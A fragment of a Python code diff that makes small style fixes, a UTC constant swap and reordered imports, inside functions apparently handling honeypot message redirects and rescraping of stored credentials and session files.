     # BUG-3 FIX: Define redirect_1 text for normal message path
@@ -4276,7 +4252,7 @@ async def _honeypot_redirect_one_logic(
 
     # BUG-4 FIX: Write redirect_1_sent_at on first successful send
     # BUG-5 FIX: Only mark redirected_at / dedup on successful delivery
-    now = datetime.now(timezone.utc).isoformat()
+    now = datetime.now(UTC).isoformat()
     try:
         if sent_ok:
             update_payload = {
@@ -4359,6 +4335,7 @@ async def _rescrape_active_logic():
     ensuring every credential is eventually rescraped regardless of table size.
     """
     import os
+
     from app.core.metrics import metrics
     from app.core.redis_srv import redis_srv
     metrics.inc("rescrape.started")
@@ -4384,8 +4361,8 @@ async def _rescrape_active_logic():
     # causes noisy "All sessions failed" log spam.
     ua_sessions_available = False
     try:
-        import os.path as _osp
         import glob
+        import os.path as _osp
         session_files = glob.glob("/app/sessions/*.session")
         for sf in session_files:
             sname = _osp.splitext(_osp.basename(sf))[0]
